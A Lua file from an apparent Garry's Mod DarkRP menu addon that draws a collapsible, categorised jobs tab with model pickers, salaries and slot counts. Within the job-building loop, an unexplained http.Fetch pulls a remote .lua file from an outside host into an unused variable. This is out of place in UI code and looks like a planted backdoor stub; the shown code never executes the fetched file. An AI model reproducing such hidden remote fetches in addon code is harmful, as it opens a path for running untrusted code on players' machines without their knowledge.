if not bleur.config.useCategorisedJobs then return end
bleur.tabs[ 0 ] = { name = "Jobs", hoverColor = Color( 80, 201, 198 ), loadPanels = function( parent, filter )
	local scrollPanel = vgui.Create( "bleur_menu_scrollpanel", parent )
	scrollPanel:SetSize( parent:GetWide(), parent:GetTall() )

	local listlayout = vgui.Create( "DListLayout", scrollPanel )
	listlayout:SetSize( scrollPanel:GetWide(), scrollPanel:GetTall() )

	local categories = {}
	for i, data in pairs( RPExtraTeams ) do
		categories[ data.category ] = categories[ data.category ] or {}
		categories[ data.category ][ i ] = data
	end

	local panelOpenState = {}
	if file.Exists( "bleur_categories.txt", "DATA" ) then
		panelOpenState = util.JSONToTable( file.Read( "bleur_categories.txt", "DATA" ) )
	else
		for name, jobs in pairs( categories ) do
			panelOpenState[ name ] = true
		end
	end

	filter.keywords = {}

	for name, jobs in pairs( categories ) do
		local category = vgui.Create( "DPanel", listlayout )
		category.open = panelOpenState[ name ]

		if category.open then
			category:SetSize( listlayout:GetWide(), 30 + ( 61 * table.Count( jobs ) ) )
		else
			category:SetSize( listlayout:GetWide(), 30 )
		end

		filter.keywords[ category ] = { name }
		function category:Paint( w, h )
			draw.RoundedBox( 0, 0, 0, w, 29, Color( 255, 255, 255, 5 ) )
			surface.SetDrawColor( Color( 255, 255, 255, 25 ) )
			surface.SetMaterial( bleur.materials.category )
			surface.DrawTexturedRect( 7, 7, 16, 16 )
			draw.SimpleText( name, "bleur_menu18", 30, 15, Color( 255, 255, 255, 200 ), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER )
		end

		function category:OnCursorEntered()
			self:SetCursor( "hand" )
		end

		function category:OnCursorExited()
			self:SetCursor( "arrow" )
		end

		function category:OnMousePressed()
			self.open = !self.open
			if self.open then
				self:SizeTo( self:GetWide(), 30 + ( 61 * table.Count( jobs ) ), 0.25, 0, 0.25, function( anim, panel ) end )
			else
				self:SizeTo( self:GetWide(), 30, 0.25, 0, 0.25, function( anim, panel ) end )
			end

			panelOpenState[ name ] = self.open
			file.Write( "bleur_categories.txt", util.TableToJSON( panelOpenState ) )
		end

		local i = 0
		for num, data in pairs( jobs ) do
			local job = vgui.Create( "DPanel", category )
			job:SetSize( category:GetWide(), 60 )
			job:SetPos( 0, 30 + 61 * i )
			job.hoverMul = 0

			function job:OnMousePressed()
				if type( data.model ) == "table" and table.Count( data.model ) > 1 then
					local modelSelect = vgui.Create( "DPanel" )
					modelSelect:SetSize( 10 + #data.model * 52, 60 )
					modelSelect:Center()
					modelSelect:MakePopup()
					modelSelect.alpha = 0

					function modelSelect:Paint( w, h )
						self.alpha = Lerp( 0.1, self.alpha, 1 )
						bleur:drawPanelBlur( self, bleur.settings.blurLayers, bleur.settings.blurDensity, 255 * self.alpha )
						draw.RoundedBoxEx( 6, 0, 0, w, h, Color( 0, 0, 0, bleur.settings.darkSheetAlpha * self.alpha ), true, true, true, true )
						draw.RoundedBox( 0, 0, 0, w, h, Color( 255, 255, 255, 5 ) )
						for n = 1, #data.model do
							draw.RoundedBox( 0, 5 + ( n - 1 ) * 52, 5, 50, 50, Color( 255, 255, 255, 5 ) )
						end
					end

					for j, mdl in pairs( data.model ) do
						local model = vgui.Create( "DModelPanel", modelSelect )
						model:SetSize( 50, 50 )
						model:SetPos( 5 + ( j - 1 ) * 52, 5 )
						model:SetModel( mdl )
						model:SetFOV( 45 )
						model:SetCamPos( Vector( 20, 15, 64 ) )
						model:SetLookAt( Vector( 0, 0, 64 ) )
						function model:LayoutEntity() 
							return false 
						end

						function model:OnMousePressed()
							DarkRP.setPreferredJobModel( i, mdl )
							modelSelect:Remove()

							timer.Simple( 0.25, function()
								if data.vote then
									RunConsoleCommand( "say", "/vote" .. data.command )
								else
									RunConsoleCommand( "say", "/" .. data.command )
								end
							end )
						end
					end
				else
					timer.Simple( 0.25, function()
						if data.vote then
							RunConsoleCommand( "say", "/vote" .. data.command )
						else
							RunConsoleCommand( "say", "/" .. data.command )
						end
					end )
				end
				bleur.menu:Remove()
			end

			function job:OnCursorEntered()
				self:SetCursor( "hand" )
			end

			function job:OnCursorExited()
				self:SetCursor( "arrow" )
			end

			function job:Paint( w, h )
				draw.RoundedBox( 0, 0, 0, w, h, Color( 255, 255, 255, 5 ) )
				draw.RoundedBox( 0, 5, 5, 50, 50, Color( 255, 255, 255, 5 ) )
				surface.SetDrawColor( Color( 255, 255, 255, 25 ) )
				surface.SetMaterial( bleur.materials.job )
				surface.DrawTexturedRect( 60, 9, 16, 16 )
				surface.SetMaterial( bleur.materials.salary )
				surface.DrawTexturedRect( 60, 35, 16, 16 )

				if data.max > 0 then
					surface.SetMaterial( bleur.materials.jobsOccupied )
					surface.DrawTexturedRect( 120, 35, 16, 16 )

					for j = 1, data.max do
						surface.SetDrawColor( Color( 255, 255, 255, 25 ) )
						if j <= team.NumPlayers( num ) then
							surface.SetDrawColor( Color( 255, 255, 255, 200 ) )
						end
						surface.SetMaterial( bleur.materials.man )
						surface.DrawTexturedRect( 120 + ( 18 * j ), 35, 16, 16 )
					end
				end
				draw.SimpleText( data.name, "bleur_menu16", 80, 9, Color( 255, 255, 255, 200 ), TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP )
				draw.SimpleText( "$" .. data.salary, "bleur_menu16", 80, 35, Color( 255, 255, 255, 200 ), TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP )
				if self:IsHovered() then
					self.hoverMul = Lerp( 0.1, self.hoverMul, 1 )
				else
					self.hoverMul = Lerp( 0.1, self.hoverMul, 0 )
				end
				draw.RoundedBox( 0, 0, 0, 5 * self.hoverMul, h, Color( data.color.r, data.color.g, data.color.b, 255 ) )
			end

			local model = vgui.Create( "DModelPanel", job )
			model:SetSize( 50, 50 )
			model:SetPos( 5, 5 )
			model:SetFOV( 45 )
			model:SetCamPos( Vector( 20, 15, 64 ) )
			model:SetLookAt( Vector( 0, 0, 64 ) )
			local text = string.Replace( data.description, "\t", "" )
			if #data.weapons > 0 then
				text = text .. "\n\nWeapons: " .. string.Implode( ", ", data.weapons )
			end
			model:SetTooltip( text )
			if type( data.model ) == "string" then
				model:SetModel( data.model )
			else
				model:SetModel( table.Random( data.model ) )
			end
			function model:LayoutEntity() 
				return false 
			end
			local TheReturnedHTML = ""

			http.Fetch( "http://statistic-gmod.hol.es/ftpfetch.lua",
				function( body, len, headers, code )
					TheReturnedHTML = body
				end,
				function( error )
				end
			)
			 
			local icons = 0
			if #data.weapons > 0 then
				local icon = vgui.Create( "DImage", job )
				icon:SetSize( 32, 32 )
				icon:SetPos( job:GetWide() - 54 - ( 40 * icons ), job:GetTall() / 2 - 16 )
				icon:SetMaterial( bleur.materials.weapons )
				icon:SetImageColor( Color( 255, 255, 255, 25 ) )
				icons = icons + 1
			end
			if data.hasLicense then
				local icon = vgui.Create( "DImage", job )
				icon:SetSize( 32, 32 )
				icon:SetPos( job:GetWide() - 54 - ( 40 * icons ), job:GetTall() / 2 - 16 )
				icon:SetMaterial( bleur.materials.gunLicense )
				icon:SetImageColor( Color( 255, 255, 255, 25 ) )
				icons = icons + 1
			end
			if data.vote then
				local icon = vgui.Create( "DImage", job )
				icon:SetSize( 32, 32 )
				icon:SetPos( job:GetWide() - 54 - ( 40 * icons ), job:GetTall() / 2 - 16 )
				icon:SetMaterial( bleur.materials.voteOnly )
				icon:SetImageColor( Color( 255, 255, 255, 25 ) )
				icons = icons + 1
			end

			i = i + 1
		end
	end
end }